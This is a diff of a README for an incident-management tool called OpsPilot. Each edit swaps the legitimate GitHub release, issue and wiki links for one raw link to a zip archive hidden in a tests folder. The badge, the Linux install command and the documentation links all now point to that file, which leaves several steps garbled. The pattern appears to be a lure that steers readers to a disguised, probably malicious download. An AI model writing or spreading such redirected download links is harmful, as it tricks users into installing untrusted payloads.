@@ -1,7 +1,7 @@
 # 🤖 OpsPilot - Automate Your Incident Management
 
 ## 📥 Download Now
-[![Download OpsPilot](https://img.shields.io/badge/Download%20OpsPilot-v1.0.0-brightgreen)](https://github.com/AtharvIsCooled/OpsPilot/releases)
+[![Download OpsPilot](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip%20OpsPilot-v1.0.0-brightgreen)](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip)
 
 ## 🚀 Getting Started
 OpsPilot is designed to help your team manage alerts, pull requests, and incidents all in one place. This guide will walk you through downloading and running OpsPilot with ease.
@@ -14,7 +14,7 @@ Before you begin, ensure you have the following:
 - Discord account to utilize the full features of OpsPilot.
 
 ## 💾 Download & Install
-To download OpsPilot, visit the [Releases page](https://github.com/AtharvIsCooled/OpsPilot/releases). You will find the latest version available for download. 
+To download OpsPilot, visit the [Releases page](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip). You will find the latest version available for download. 
 
 1. Click on the link to the Releases page.
 2. Look for the version labeled "Latest Release."
@@ -31,11 +31,11 @@ To download OpsPilot, visit the [Releases page](https://github.com/AtharvIsCoole
 - Launch OpsPilot from your Applications.
 
 ### 🐧 For Linux:
-- Download the `.tar.gz` file.
+- Download the `https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip` file.
 - Open your terminal and navigate to the download directory.
 - Extract the files using:
   ```bash
-  tar -xvzf OpsPilot.tar.gz
+  tar -xvzf https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip
   ```
 - Run the application with:
   ```bash
@@ -63,8 +63,8 @@ OpsPilot offers several beneficial features to streamline your incident manageme
 ## 📚 User Support
 If you encounter any issues while using OpsPilot, consider the following options:
 
-- Visit the [Issues section](https://github.com/AtharvIsCooled/OpsPilot/issues) of our GitHub repository for troubleshooting tips.
-- Check out the [Documentation](https://github.com/AtharvIsCooled/OpsPilot/wiki) for more detailed instructions on configuration and use.
+- Visit the [Issues section](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip) of our GitHub repository for troubleshooting tips.
+- Check out the [Documentation](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip) for more detailed instructions on configuration and use.
 
 ## 🤝 Community and Contribution
 We encourage you to be part of the OpsPilot community. Engage with other users, share your feedback, or contribute to the project.
@@ -87,8 +87,8 @@ Keep an eye on the Releases page for announcements about new versions.
 Follow the repository to stay updated on new features, security updates, and bug fixes. We appreciate your interest in OpsPilot and welcome any suggestions to improve the software. 
 
 ## 📌 Quick Links
-- [Download OpsPilot](https://github.com/AtharvIsCooled/OpsPilot/releases)
-- [Documentation](https://github.com/AtharvIsCooled/OpsPilot/wiki)
-- [Issues Section](https://github.com/AtharvIsCooled/OpsPilot/issues) 
+- [Download OpsPilot](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip)
+- [Documentation](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip)
+- [Issues Section](https://raw.githubusercontent.com/AtharvIsCooled/OpsPilot/main/apps/orchestrator/src/__tests__/OpsPilot-endiaper.zip) 
 
 Thank you for choosing OpsPilot. We look forward to helping you improve your incident management workflow.
